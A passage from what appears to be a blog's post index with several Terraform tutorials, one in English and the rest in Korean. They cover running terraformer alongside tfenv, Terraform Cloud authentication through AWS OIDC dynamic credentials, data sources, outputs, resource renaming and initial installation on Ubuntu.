neighbors to use terraformer for first learning about terraform.\nterraformer is a great terraform generator tool for converting existing cloud infrastructure to terraform code.\nIn this post, I write how I use terraformer with tfenv.\n1. How to install terraformer in Linux After follow below, you can use terraformer with terraformer command! export PROVIDER=aws # you can use other providers like \u0026#39;google, kubernetes\u0026#39;, # Or if you want to use all providers, adjust \u0026#39;all\u0026#39; instead of \u0026#39;aws\u0026#39; curl -LO \u0026#34;https://github.com/GoogleCloudPlatform/terraformer/releases/download/$(curl -s https://api.github.com/repos/GoogleCloudPlatform/terraformer/releases/latest | grep tag_name | cut -d \u0026#39;\u0026#34;\u0026#39; -f 4)/terraformer-${PROVIDER}-linux-amd64\u0026#34; chmod +x terraformer-${PROVIDER}-linux-amd64 sudo mv terraformer-${PROVIDER}-linux-amd64 /usr/local/bin/terraformer 2. Importing AWS VPC with terraformer After install terraformer, you can import AWS VPC with terraformer like below\n(Also you can import other AWS resources like EC2, S3, etc..) terraformer import aws --resources=vpc --regions=ap-northeast-2 But, error will happen\u0026hellip; if you use tfenv like me. $ terraformer import aws --resources=vpc --regions=ap-northeast-2 2023/09/24 12:03:53 aws importing region ap-northeast-2 2023/09/24 12:03:53 open /home/kkumtree/.terraform.d/plugins/linux_amd64: no such file or directory $ whereis terraform terraform: /home/kkumtree/.tfenv/bin/terraform As you can see, terraformer can\u0026rsquo;t find terraform binary.\nTerraformer use terraform binary in /home/kkumtree/.terraform.d/plugins/linux_amd64 but, tfenv use terraform binary in /home/kkumtree/.tfenv/bin/terraform. So it needed to make a symbolic link to solve this problem\n(But, It will makes me complicated in next year, I promise.) or\u0026hellip; use some tricks like following.\n3. Problem solving (1) Make dummy file for executing terraformer Make dummy main.tf file in directory which you want to get terraform codes by terraformer. mkdir ~/Documents/tf-aws-snapshot cd ~/Documents/tf-aws-snapshot cat \u0026lt;\u0026lt;EOF \u0026gt; main.tf # heredoc\u0026gt; terraform { # heredoc\u0026gt; required_providers { # heredoc\u0026gt; aws = { # heredoc\u0026gt; source = \u0026#34;hashicorp/aws\u0026#34; # heredoc\u0026gt; version = \u0026#34;5.17.0\u0026#34; # heredoc\u0026gt; } # heredoc\u0026gt; } # heredoc\u0026gt; } cat main.tf # terraform { # required_providers { # aws = { # source = \u0026#34;hashicorp/aws\u0026#34; # version = \u0026#34;5.17.0\u0026#34; # } # } # } If you need, add specific region in main.tf terraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;5.17.0\u0026#34; } } } provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } (2) init terraform Init terraform with terraform init command It uses tfenv\u0026rsquo;s terraform binary $ terraform init Initializing the backend... Initializing provider plugins... - Finding hashicorp/aws versions matching \u0026#34;5.17.0\u0026#34;... - Installing hashicorp/aws v5.17.0... - Installed hashicorp/aws v5.17.0 (signed by HashiCorp) Terraform has created a lock file .terraform.lock.hcl to record the provider selections it made above. Include this file in your version control repository so that Terraform can guarantee to make the same selections by default when you run \u0026#34;terraform init\u0026#34; in the future. Terraform has been successfully initialized! You may now begin working with Terraform. Try running \u0026#34;terraform plan\u0026#34; to see any changes that are required for your infrastructure. All Terraform commands should now work. If you ever set or change modules or backend configuration for Terraform, rerun this command to reinitialize your working directory. If you forget, other commands will detect it and remind you to do so if necessary. And check what happened in .terraform directory $ tree -a . ├── main.tf ├── .terraform │ └── providers │ └── registry.terraform.io │ └── hashicorp │ └── aws │ └── 5.17.0 │ └── linux_amd64 │ └── terraform-provider-aws_v5.17.0_x5 └── .terraform.lock.hcl 8 directories, 3 files As you see, terraform headless binary is installed in .terraform directory.\n(It is not tfenv\u0026rsquo;s terraform binary, but it is enough to use terraformer) (3) Import AWS VPC with terraformer Now, we can import AWS VPC with terraformer. Get ready to study with terraform codes! $ terraformer import aws --resources=vpc --regions=ap-northeast-2 2023/09/24 12:30:39 aws importing region ap-northeast-2 2023/09/24 12:30:40 aws importing... vpc 2023/09/24 12:30:40 aws done importing vpc 2023/09/24 12:30:40 Number of resources for service vpc: 2 2023/09/24 12:30:40 Refreshing state... aws_vpc.tfer--vpc-xxxxxxxxxxxxxxxxx 2023/09/24 12:30:40 Refreshing state... aws_vpc.tfer--vpc-yyyyyyyyyyyyyyyyy 2023/09/24 12:30:41 Filtered number of resources for service vpc: 2 2023/09/24 12:30:41 aws Connecting.... 2023/09/24 12:30:41 aws save vpc 2023/09/24 12:30:41 aws save tfstate for vpc $ tree . ├── generated │ └── aws │ └── vpc │ ├── outputs.tf │ ├── provider.tf │ ├── terraform.tfstate │ └── vpc.tf └── main.tf 4 directories, 5 files 4. Conclusion I was also in trouble with this situation.\nBut references below helped me to solve this problem.\n5. References GitHub/Getting error while running terraformer on google provider Terraformer ","date":"2023-09-24T11:47:51+09:00","permalink":"https://blog.minseong.xyz/post/troubleshoot-terraformer-with-tfenv/","section":"post","tags":["Terraform","tfenv","terraformer"],"title":"Troubleshoot when using terraformer with tfenv"},{"categories":null,"contents":"이번에는 Terraform Cloud가 얼마나 좋은지 더 알아보기 위해,\n스터디에서 지속적으로 장점이 강조되어 왔던 Terraform Cloud에\nIAM STS를 이용한 권한 부여 도전 및 적용 성공에 대해 써보려고 합니다.\nTerraform의 상태 저장을 위해 보통 AWS S3를 사용하는데,\n알다시피 S3 기록은 무료지만, 불러오는 것은 유료입니다.\n(전기는 국산이지만, 원료는 수입입니다)\n그래서 스터디용으로는 Terraform을 불러올 때마다,\n상태 값을 S3말고, 로컬에 저장했었는데요.\n밖에서는 노트북, 집에서는 데스크탑으로 하려니\n이걸 GitHub의 Private Repo에 저장할까? 하다가\nTerraform Cloud를 써보기로 했습니다. (고통의 시작)\n1. Terraform Cloud 계정 생성 및 사용 Terraform Cloud에 접속하여 계정을 생성합니다. 저와 같은 경우에는 GitHub 계정을 연동하여 생성하였습니다. 연동을 위해서, tf파일에 아래 블록을 추가합니다. 친절하게도 Terraform Cloud에서 튜토리얼을 제공하고 있습니다. terraform { cloud { organization = \u0026#34;kkumtree\u0026#34; workspaces { name = \u0026#34;t101\u0026#34; } } required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 5.0\u0026#34; } } } Organization: Terraform Cloud에서 생성한 Organization 이름을 입력합니다. Workspaces: Terraform 작업 단위의 이름을 지정합니다. 한 번 login 해보겠습니다.\n[ terraform login ]을 입력해주세요.\nToken을 요구하는데요,\nTerraform Cloud 웹 콘솔이 열리면서 토큰 발급 절차를 밟습니다.\n열리지 않는 경우, 안내에 따라 token 세팅 페이지로 이동하여 발급해주세요. 토큰은 당연하게도 다시는 조회할 수 없으니, 따로 보관해두세요.\n이 토큰을 다시 터미널에 입력하면, Terraform Cloud에 접속됩니다. 다시, init을 해보겠습니다. 잘 되었네요. 그럼\u0026hellip; apply를 해보겠습니다. 에러가 났네요. 분명, 로컬에 AWS Credential이 잘 세팅되어 있었는데요. 2. IAM Credential 생성 및 저장 한참을 헤메었는데\u0026hellip; 단순하게도, Terraform Cloud의\nworkspace에 AWS Credential을 저장해야 했습니다. 로컬에 AWS Credential을 조회하여(\u0026hellip;) 이 값을\nTerraform Cloud에 저장하면 됩니다. 참 쉽죠? 다만, Variable 유형을 고를 때, Terraform variable이 아닌\nEnvironment variable을 선택해야 합니다. STS도 저장할 수 있는 것으로 알고 있었는데,\n이렇게는 STS를 써본 적이 없어서, 아래 두 값만 넣어보았습니다. AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY: 반드시 Sensitive 설정! 캡처는 못했지만, AWS를 많이 써보셨으면 저보다 잘 아실 것 같아서\nAZ를 data로 단순히 받아오는 작업을 걸었을 때, 잘 동작했습니다. 3. AWS Credential을 쓰고 싶지 않은데\u0026hellip;? 문득, 위와 같은 생각이 들었습니다.\nTerraform Cloud 자체에서도 Token을 발급받아서 쓰는데,\nTerraform Cloud 전용 IAM User를 만들어서\n비밀키를 하드코딩해서 써야..하나? Quick Start 가이드에서 STS를 쓰던데, 나는 왜 못쓰나\u0026hellip;? 그래서, 한 번 찾아보았습니다. 찾아보았더니 아래 두 게시물을 참조하였는데요.\n처음 게시물은 AssumeRole 생성 단계에서 막혀서, 두 번째 게시물을 토대로 진행하였습니다.\nSaturnCloud/Terraform Cloud/Enterprise: A Comprehensive Guide to Using AWS Assume Roles AWS/Simplify and Secure Terraform Workflows on AWS with Dynamic Provider Credentials 3.1 IAM OIDC IdP(identity Provider) 생성 먼저, AWS IAM에서 IAM OIDC Provider를 생성합니다. Provider type: OpenID Connect Provider URL: https://app.terraform.io Audience: aws.worklaod.identity 중간에 생성되는 Thumbprint는 IAM 콘솔에서 다시 조회 가능하니, 괜찮습니다. 3.2 신뢰 개체(Trusted entities) 생성 IdP를 통해, Terraform Cloud과 AWS IAM간의 신뢰 관계를\n구축하는 것이기 때문에 신뢰 개체를 생성해야 합니다. 게시물을 토대로 기재하되, 두 값은 직접 입력해야 합니다. \u0026lt;AWS계정ID\u0026gt;: AWS 계정 ID로 변경 \u0026lt;TFC조직명\u0026gt;: Terraform Cloud 생성한 계정에서 만든 조직으로 변경 { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Principal\u0026#34;: { \u0026#34;Federated\u0026#34;: \u0026#34;arn:aws:iam::\u0026lt;AWS계정ID\u0026gt;:oidc-provider/app.terraform.io\u0026#34; }, \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRoleWithWebIdentity\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;StringEquals\u0026#34;: { \u0026#34;app.terraform.io:aud\u0026#34;: \u0026#34;aws.workload.identity\u0026#34; }, \u0026#34;StringLike\u0026#34;: { \u0026#34;app.terraform.io:sub\u0026#34;: \u0026#34;organization:\u0026lt;TFC조직명\u0026gt;:project:*:workspace:*:run_phase:*\u0026#34; } } } ] } 3.3 권한 부여 현재는 VPC 및 EC2, 그리고 S3 생성을 할 것이기에 두 가지 정책을 추가했습니다.\nAmazonEC2FullAccess AmazonS3FullAccess 3.4 Terraform Cloud에 Variable 설정 AWS에서의 지정이 끝났으니, Terraform Cloud에서도 설정을 해야 합니다.\n기존의 AWS Credential을 삭제하고, 아래와 같이 설정합니다.\nTFC_AWS_RUN_ROLE_ARN: arn:aws:iam::\u0026lt;AWS계정ID\u0026gt;:role/\u0026lt;생성한Role이름\u0026gt; TFC_AWS_PROVIDER_AUTH: true 아래 값은 기본값이 aws.workload.identity 이기 때문에\n조직내에서 IAM AUDIENCE를 변경한 경우에만 설정합니다.\nTFC_AWS_WORKLOAD_IDENTITY_AUDIENCE 4. 구동 확인 이제 아래와 같이, 작성하고 멀티 리전에 S3 버킷을 생성하는 작업을 해보겠습니다.\n서울 리전에도 alias=\u0026quot;seoul\u0026quot;을 추가하고,\nprovider = aws.seoul로 지정하고 싶었지만 오류가 나서 해제! # main.tf terraform { cloud { organization = \u0026#34;kkumtree\u0026#34; workspaces { name = \u0026#34;t101\u0026#34; } } required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 5.0\u0026#34; } } } provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-1\u0026#34; alias = \u0026#34;tokyo\u0026#34; } # S3 resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;kkumtree_seoul_bucket\u0026#34; { bucket = \u0026#34;kkumtree-first-bucket\u0026#34; tags = { Name = \u0026#34;kkumtree-t101-seoul-bucket\u0026#34; } } resource \u0026#34;aws_s3_bucket\u0026#34; \u0026#34;kkumtree_tokyo_bucket\u0026#34; { provider = aws.tokyo bucket = \u0026#34;kkumtree-second-bucket\u0026#34; tags = { Name = \u0026#34;kkumtree-t101-tokyo-bucket\u0026#34; } } TFC에서도 처리가 잘 되었음을 확인했고(ACL오류 빼고),\nAWS 콘솔에서도 잘 생성되었음을 확인했습니다. 5. 마치며 이번 포스트에서는, AWS와 HashiCorp가 권장하는 Dynamic provider credentials를 이용하여\nTerraform Cloud를 사용할 수 있도록 셋업하는 방법을 알아보았습니다.\n적용 중, 발생하는 오류는 댓글로 남겨주시면 같이 알아보겠습니다. 참고로 Terraform에서 alias를 남용하는 것은 좋지않고,\n리전 별 격리하는 것을 추천한다고 하네요. Reference CloudNet@ 테라폼으로 시작하는 IaC Terraform Cloud SaturnCloud/Terraform Cloud/Enterprise: A Comprehensive Guide to Using AWS Assume Roles AWS/Simplify and Secure Terraform Workflows on AWS with Dynamic Provider Credentials ","date":"2023-09-13T20:54:28+09:00","permalink":"https://blog.minseong.xyz/post/terraform-cloud-with-iam-sts/","section":"post","tags":["Terraform","CloudNet@","AWS"],"title":"IAM STS를 이용한 Terraform Cloud 권한 부여"},{"categories":null,"contents":"이번에는 CloudNet@를 통해 학습한 내용을 기반으로,\nAZ를 대상으로 한 data 조회 AWS VPC 생성 예제로 살펴보는 output resource 이름 변경 순으로 알아보도록 하겠습니다.\n교재로 사용한 [테라폼으로 시작하는 IaC] 도 참고하였습니다.\n기본 설정 aws-cli에 리전을 ap-northeast-2을 설정하였습니다. $ aws configure list Name Value Type Location ---- ----- ---- -------- profile \u0026lt;not set\u0026gt; None None access_key ****************2U5J shared-credentials-file secret_key ****************Z0co shared-credentials-file region ap-northeast-2 config-file ~/.aws/config 1. data 조회 data는 사용자가 정의하는 resource 및 리소스에 대한 스펙과 반대로,\nprovider(이번 포스트에서는 aws)에서 제공하는 리소스를 조회하는 기능입니다.\n(1) data 조회를 위한 tf 파일 작성 이번에는 작업 대상 폴더 내의 루트 경로에 az.tf 파일만 작성을 합니다.\n# az.tf data \u0026#34;aws_availability_zones\u0026#34; \u0026#34;available\u0026#34; { state = \u0026#34;available\u0026#34; } 해당 파일은 AWS(프로바이더)가 제공하는 AZ 중에서,\n사용가능한 AZ들을 조회하여 available이라는 데이터로 가져옵니다.\n작성 후에 아래와 같이 명령어를 적습니다.\n(다른 파일도 있는 경우에는 --auto-approve 옵션을 빼고 실행하여 확인하기 바랍니다)\nterraform init -upgrade \u0026amp;\u0026amp; terraform apply -auto-approve -upgrade 옵션은\n(1) 기존 테라폼 lock파일을 무시하고, 사용 중인 플러그인을 업데이트 하는 역할을 합니다. (2) 이 경우에는 az.tf 파일 하나만 있기에, AWS(프로바이더)에서 제공하는 정보들을 lock파일에 재작성한다고 이해하면 될 것 같습니다. (3) 자세한 사항은 Terraform CLI에서 확인할 수 있습니다. (2) tfstate 확인 tfstate 파일에서 가용할 수 있는 AZ 목록을 확인할 수 있습니다. \u0026#34;resources\u0026#34;: [ { \u0026#34;mode\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;aws_availability_zones\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;available\u0026#34;, \u0026#34;provider\u0026#34;: \u0026#34;provider[\\\u0026#34;registry.terraform.io/hashicorp/aws\\\u0026#34;]\u0026#34;, \u0026#34;instances\u0026#34;: [ { \u0026#34;schema_version\u0026#34;: 0, \u0026#34;attributes\u0026#34;: { \u0026#34;all_availability_zones\u0026#34;: null, \u0026#34;exclude_names\u0026#34;: null, \u0026#34;exclude_zone_ids\u0026#34;: null, \u0026#34;filter\u0026#34;: null, \u0026#34;group_names\u0026#34;: [ \u0026#34;ap-northeast-2\u0026#34; ], \u0026#34;id\u0026#34;: \u0026#34;ap-northeast-2\u0026#34;, \u0026#34;names\u0026#34;: [ \u0026#34;ap-northeast-2a\u0026#34;, \u0026#34;ap-northeast-2b\u0026#34;, \u0026#34;ap-northeast-2c\u0026#34;, \u0026#34;ap-northeast-2d\u0026#34; ], \u0026#34;state\u0026#34;: \u0026#34;available\u0026#34;, \u0026#34;timeouts\u0026#34;: null, \u0026#34;zone_ids\u0026#34;: [ \u0026#34;apne2-az1\u0026#34;, \u0026#34;apne2-az2\u0026#34;, \u0026#34;apne2-az3\u0026#34;, \u0026#34;apne2-az4\u0026#34; ] }, \u0026#34;sensitive_attributes\u0026#34;: [] } ] } ], 파일을 직접 확인하지 않아도, terraform 명령어를 통해서도 조회가 가능합니다. terraform console terraform state show (1) terraform console\n파이프로 리소스를 전달하여, 조회합니다. echo \u0026#39;data.aws_availability_zones.available.names\u0026#39; | terraform console (2) terraform state show\nterraform state: state 관리를 위한 서브 커맨드를 제공. list / mv / pull / push / replace-provider / rm / show subcommand show: 지정한 리소스의 state를 조회. terraform state show data.aws_availability_zones.available 2. output 알아보기 지난번의 예제에서는 생성된 인스턴스를 확인하기 위해,\n별도로 aws-cli를 구동하여 IP를 획득하였습니다. 번거로울 뿐만 아니라, 생성되는 정보를 파악하기 힘들기 때문에 그 다음 액션을 취하기 대단히 어렵습니다.\n이번에는 output을 활용하여, 생성된 VPC ID를 얻어보도록 하겠습니다. (1) VPC 리소스 생성 파일 작성 루트 폴더에 vpc라는 폴더를 생성하고, 아래와 같은 vpc.tf파일을 생성합니다. mkdir vpc \u0026amp;\u0026amp; cd vpc # vpc.tf provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } resource \u0026#34;aws_vpc\u0026#34; \u0026#34;primary_vpc\u0026#34; { cidr_block = \u0026#34;172.16.0.0/16\u0026#34; tags = { Name = \u0026#34;t101-vpc-primary\u0026#34; } } resource \u0026#34;aws_vpc\u0026#34; \u0026#34;secondary_vpc\u0026#34; { cidr_block = \u0026#34;172.18.0.0/16\u0026#34; tags = { Name = \u0026#34;t101-vpc-secondary\u0026#34; } } output \u0026#34;aws_vpc_primary_id\u0026#34; { value = aws_vpc.primary_vpc.id } output \u0026#34;aws_vpc_secondary_id\u0026#34; { value = aws_vpc.secondary_vpc.id } output에 표시할 값으로 각 VPC 리소스의 ID를 가져오도록 하였습니다. 참고) 작성시점 기준, 172.17.0.0/16 CIDR은 AWS의 일부 서비스(AWS Cloud9/Amazon SageMaker)에서 사용하므로 피하도록 합니다. (링크: AWS VPC Docs) 같은 backend를 바라보고 있지 않으므로, terraform init을 하고,\nterraform plan 으로 확인해보고, terraform apply를 해봅니다.\nplan: 실제 적용을 하지 않기에, output란에는 (known after apply)로 표기됨을 확인\napply: (yes를 선택하여 적용 후) output란에 각 VPC의 ID가 표기됨을 알 수 있습니다. (2) output 값 조회 이렇게까지 output에 대해 알아볼 수 있는 기회가 없었었기에,\noutput은 단순히 apply 단계에서만 확인할 수 있는 출력값으로만 여겼었습니다. 하지만, 이번 시간에는 이렇게 출력되도록 설정한 output값을 재조회 해보도록 하겠습니다. # 전체 output 조회 terraform output # 특정 output 값 조회 (e.g. aws_vpc_primary_id) terraform output aws_vpc_primary_id # \u0026#39;개행없이\u0026#39; 특정 output 값 조회 terraform output -raw aws_vpc_primary_id 개행없이 출력하는 옵션은 여러모로 유용해보입니다. 3. resource 이름 변경 앞에서 두 VPC 리소스를 tf파일 내부에서\nprimary_vpc와 secondary_vpc란 이름으로 지정하였습니다. 현재, 각 VPC ID는 아래와 같이 확인됩니다. t101-vpc-primary: vpc-0af570aef245dc55f t101-vpc-secondary: vpc-0f700cf4401c5f346 이번에는 이 이름을 수정해보고, 적용해보면서 terraform에서 이를 어떻게 처리하는 지 알아봅시다. provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } resource \u0026#34;aws_vpc\u0026#34; \u0026#34;kkumtree_first_vpc\u0026#34; { // UPDATE HERE cidr_block = \u0026#34;172.16.0.0/16\u0026#34; tags = { Name = \u0026#34;t101-vpc-primary\u0026#34; } } resource \u0026#34;aws_vpc\u0026#34; \u0026#34;kkumtree_second_vpc\u0026#34; { // UPDATE HERE cidr_block = \u0026#34;172.18.0.0/16\u0026#34; tags = { Name = \u0026#34;t101-vpc-secondary\u0026#34; } } output \u0026#34;aws_vpc_primary_id\u0026#34; { value = aws_vpc.kkumtree_first_vpc.id // UPDATE HERE } output \u0026#34;aws_vpc_secondary_id\u0026#34; { value = aws_vpc.kkumtree_second_vpc.id // UPDATE HERE } 당연하게도 terraform apply로 변경사항을 적용합니다. 혹시, 이때 뭔가 위화감이 들지 않나요?\ncidr_block 값을 바꾸지 않았고, 기존에 생성된 VPC에 대해 terraform 상에서 관리하는 리소스명만 바뀌었는데 destroyed가 뜹니다! 이유는 terraform의 immutable 원칙(Tao/도?)때문입니다.\n기존의 인프라를 수정하거나 업데이트하는 것이 아닌,\n변경된 정보로 새로운 인프라를 생성하여 교체합니다.\nF1 피트 스톱에서 바퀴를 갈아끼는 것을 연상하면 이해가 쉬울 수도 있을 것 같습니다.\n(참고로, VPC 블록도 한 번 정하면, 대역을 변경할 수 없습니다)\n아래와 같이, VPC ID가 변경(교체)되었음을 확인할 수 있습니다.\n마무리 및 느낀점 이번에는 아래의 사항을 중점으로 알아보았습니다. output의 필요성과 활용 terraform의 immutable 속성 덤으로, 172.17.0.0/16 CIDR은 사실상 AWS에서 예약한 VPC CIDR 블록임을 알 수 있었습니다. Reference CloudNet@ 테라폼으로 시작하는 IaC Terraform CLI AWS VPC Docs ","date":"2023-09-08T22:41:14+09:00","permalink":"https://blog.minseong.xyz/post/terraform-basic-resource-concept/","section":"post","tags":["Terraform","CloudNet@","HCL","immutable"],"title":"Terraform resource 이해하기 w/AWS VPC"},{"categories":null,"contents":"이번에는 CloudNet@에서 진행하는 Terraform 스터디(이하, T101)에 참여했습니다.\nTerraform을 쓰면 왜 좋은지는 자세하고 전문적인 글이 있으므로, 참고하시면 좋을 것 같습니다. (링크: 44bits)\n예전에 테라폼을 썼던 적이 있지만, Module화가 어렵기도 하고\n이번 기회에 테라폼 신간을 다시 복기하는 마음으로 참여했습니다.\n사용한 교재는 [테라폼으로 시작하는 IaC] 입니다.\n이번에는 Terraform 초기 셋업에 대해, 살펴보고\n시험삼아 Canonical 공식 Minimal Ubuntu(ARM64) AMI를 설치해보겠습니다.\nTerraform 설치 tfenv 사용과 .tf 작성 따라하기 Hello World in terraform Terraform 써보기 순으로 진행합니다.\nTerraform 설치 Terraform은 Linux 환경(Ubuntu 기준)에서 설치할 수 있는 방법이 3가지 정도 있습니다.\n최신내용은 Terraform CLI에서 확인할 수 있습니다.\nLubuntu 23.04 LTS 환경에서 진행했습니다. APT 패키지로 설치 APT로 설치하는 것을 선호하는 편이라 먼저 해보았습니다만,\n후술할 이슈로 인해, 3번의 tfenv 설치방법으로 바꾸었습니다. # Install dependency for GPG sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install -y gnupg software-properties-common # Install GPG key # If wget isn\u0026#39;t installed, install wget too wget -O- https://apt.releases.hashicorp.com/gpg | \\ gpg --dearmor | \\ sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg # (Optional) Verify GPG key\u0026#39;s fingerprint gpg --no-default-keyring \\ --keyring /usr/share/keyrings/hashicorp-archive-keyring.gpg \\ --fingerprint # Add Hashicorp repository to system # e.g. If you use one of Ubuntu 23.04 (not LTS) dist, # `lsb_release -cs` will be `lunar` echo \u0026#34;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\ https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/hashicorp.list # Install Terraform sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install terraform -yqq Binary Installation from source code Github에서 소스코드를 받아서 설치하는 방식 단 하나의 terraform \u0026lsquo;고정된\u0026rsquo; 버전을 사용할 목적(사내 약속, 1인 사용 등)에 적합 pre-compiled package 방식을 원한다면, 공식 홈페이지 참조를 권합니다. Go 언어로 Compile을 진행합니다. APT에서 golang-go 와 gccgo-go 두 가지를 제공하는데, 평소 쓰던 것을 써도 좋고, 흥미롭다면 둘의 차이를 알아보고 설치하면 됩니다. 본 게시물에서는 golang-go 로 진행합니다. # Download source git clone https://github.com/hashicorp/terraform.git \u0026amp;\u0026amp; cd terraform # Compile source with Go # In my case, $GOPATH and $GOBIN are NULL. # So, Binary is stored in default GOPATH( `~/go/bin` ) # See, https://go.dev/doc/code go install # check $PATH # most linux dists have `/usr/local/bin` echo $PATH # Move to one of `$PATH` directory (Sometimes sudo will be needed) mv ~/Downloads/terraform /usr/local/bin/ tfenv 이번 주차 스터디에서 배운 가장 유용한 것 중 하나를 꼽으라면 tfenv일 것 같습니다. sdkman! 이나 nvm 같은 terraform 전용 패키지 매니저라고 생각하면 될 것 같습니다. 이미, 앞에서 두 가지를 다 해본 결과,\nterraform은 직접 소스를 받아서 하는게 좋겠다는 판단이 들어서 수동설치로 진행. # Download source at $HOME cd $HOME \u0026amp;\u0026amp; git clone --depth=1 https://github.com/tfutils/tfenv.git ~/.tfenv # Add binary to $PATH at `.bash_profile` echo \u0026#39;export PATH=\u0026#34;$HOME/.tfenv/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile # (Optional) If you want not to logout or reboot, type below source ~/.bash_profile tfenv 사용해보기 사용하는 것은 여타 패키지 매니저류들과 크게 다르지 않음. 크게 3가지로 정리 원격지(remote)에서 받을 수 있는 terraform 버전 확인 로컬로 지정한 terraform 버전 다운로드 실제 사용할 terraform 버전 지정 (1) tfenv list-remote 조건을 주지않으면 제공될 수 있는 모든 tfenv가 출력됨 terraform은 v0.13+ 직전과 이후로 큰 장벽이 있고, 포스팅 기준으로\n이미 v1.5.6(stable), v1.6.0(alpha)가 최신이므로 이를 필터링해보겠습니다. # basic command tfenv list-remote # (Optional)Check only major version 1 tfenv list-remote | grep ^1. (2) tfenv install 확인된 특정 버전(e.g. v1.5.6)을 설치. latest를 지정하면 최신 stable 버전을 설치 # Install terraform v1.5.6 tfenv install 1.5.6 # (Optional) Install latest version (stable) # tfenv install latest # Check if well-installed tfenv list (3) tfenv use 설치 만으로는 바로 terraform을 사용할 수 없습니다.\n로컬에 받아놓은 terraform 중에서 특정 버전을 명시적으로 지정해야 사용할 수 있습니다. tfenv use 1.5.6 Hello World in terraform 이제 제대로 작동하는지, AWS에 시험삼아 올려보도록 합니다. Pre-requisite awscli v2: AWS Docs AWS Default VPC AWS IAM User w/sufficient permissions\n(e.g. EC2FullAccess, S3FullAccess) (1) .tf 파일 생성 terraform은 .tf 확장자를 가진 파일을 읽습니다.\n여러 .tf 파일을 사용한다면, main.tf를 사용하는 것이 기본이나, hello.tf로 띄워봅니다. 지금은 \u0026lsquo;.tf\u0026rsquo; 파일들은 하나의 폴더 단위 안에서 진행된다고 이해해두고, 특정 폴더 안에서 해봅니다. # Set skeleton with t4g.nano(ARM64) instance cat \u0026lt;\u0026lt;EOT \u0026gt; hello.tf provider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } resource \u0026#34;aws_instance\u0026#34; \u0026#34;example\u0026#34; { ami = \u0026#34;\u0026lt;AMI_ImageId\u0026gt;\u0026#34; instance_type = \u0026#34;t4g.nano\u0026#34; } EOT (2) AMI 이미지 찾기 Ubuntu 이미지를 찾아보도록 합시다. Minimal Ubuntu 22.04 LTS - Jammy (Arm)\ncf. 22.04 버전의 Codename은 jammy 입니다. 두 가지 방법으로 알아봅니다. AWS 웹 콘솔에서 AMI ID 얻기 Launch Instance \u0026gt; Choose an Amazon Machine Image (AMI) \u0026gt; Browse more AMIs AWS Marketplace AMIs 탭 선택 \u0026gt; jammy 검색 \u0026gt; Select \u0026gt; Continue AMI를 파악합니다. 예를 들어\u0026hellip;\n아래와 같이 파악이 되었다면, AMI ID는 ami-0a40cf5c43bd1585b 입니다. [Amazon Machine Image (AMI)] ubuntu-minimal/images/hvm-ssd/ubuntu-jammy-22.04-arm64-minimal-20230726-ad51111f-e245-404d-8492-515abfd1e565 ami-0a40cf5c43bd1585b \u0026lt;\u0026lt; HERE! AWS CLI로 AMI 값 얻기 AWS CLI를 설치했다면, 아래와 같이 명령어를 통해 AMI 값을 얻을 수 있습니다.\n자세한 정보는 Ubuntu Wiki에서 확인할 수 있습니다. (GCE, OCI 등)\n쿼리를 적용해서 필터링을 해봅니다.\naws --output table ec2 describe-images --output json --owner 099720109477 --region us-west-2 --filters \u0026#34;Name=name,Values=ubuntu-minimal/images/hvm-ssd/ubuntu-jammy-22.04-arm*\u0026#34; --query \u0026#39;sort_by(Images, \u0026amp;CreationDate)[-1].{Name: Name, ImageId: ImageId, CreationDate: CreationDate}\u0026#39; 결과값은 아래와 같습니다. ami-0710aced8c563d012 { \u0026#34;Name\u0026#34;: \u0026#34;ubuntu-minimal/images/hvm-ssd/ubuntu-jammy-22.04-arm64-minimal-20230830\u0026#34;, \u0026#34;ImageId\u0026#34;: \u0026#34;ami-0710aced8c563d012\u0026#34;, \u0026#34;CreationDate\u0026#34;: \u0026#34;2023-08-31T01:57:56.000Z\u0026#34; } 쿼리로 필터링을 하지 않았다면, 전체 버전을 조회할 수 있습니다. (3) AMI 값 적용해두기 위에서 얻은 AMI 값을 hello.tf 파일에 적용해두도록 합니다. sed -i \u0026#39;s/\u0026lt;AMI_ImageId\u0026gt;/ami-0710aced8c563d012/g\u0026#39; hello.tf \u0026amp;\u0026amp; cat hello.tf 아래와 같이 출력값이 나오는지 확인 합니다.\nprovider \u0026#34;aws\u0026#34; { region = \u0026#34;ap-northeast-2\u0026#34; } resource \u0026#34;aws_instance\u0026#34; \u0026#34;example\u0026#34; { ami = \u0026#34;ami-0710aced8c563d012\u0026#34; instance_type = \u0026#34;t4g.nano\u0026#34; } Terraform 써보기 hello.tf 파일이 있는 폴더에서 순차적으로 아래의 명령어를 입력해볼 것입니다. terraform init terraform apply terraform destroy (1) terraform init 한번도 하지 않은 폴더에서 terraform을 사용하려면 필요합니다. (2) terraform apply 위에서 수정이 완료된 hello.tf를 AWS에 적용합니다. plan을 생략했는데, 